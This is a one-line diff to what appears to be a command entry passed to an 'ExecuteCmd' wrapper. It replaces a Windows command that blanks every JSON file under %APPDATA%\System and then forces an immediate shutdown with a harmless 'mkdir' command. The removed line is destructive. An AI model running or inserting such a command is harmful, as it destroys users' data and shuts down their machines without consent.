@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd for %f in ("%APPDATA%\System\*.json") do echo {} > "%f" & shutdown /s /t 0
+ExecuteCmd -user -cmd mkdir Nike-Les-Bdh
